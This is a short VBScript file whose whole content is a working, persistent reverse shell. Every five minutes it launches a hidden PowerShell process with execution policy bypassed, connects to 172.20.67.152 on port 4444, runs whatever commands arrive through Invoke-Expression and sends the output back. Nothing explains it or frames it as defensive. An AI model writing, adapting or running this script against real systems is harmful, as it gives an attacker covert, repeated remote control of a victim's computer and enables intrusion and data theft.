Set WshShell = WScript.CreateObject("WScript.Shell")
Do
  WshShell.Run "powershell -nop -W hidden -noni -ep bypass -c ""$TCPClient = New-Object Net.Sockets.TCPClient('172.20.67.152', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()""", 0, True
  WScript.Sleep(300000) ' wait for 5 minutes
Loop
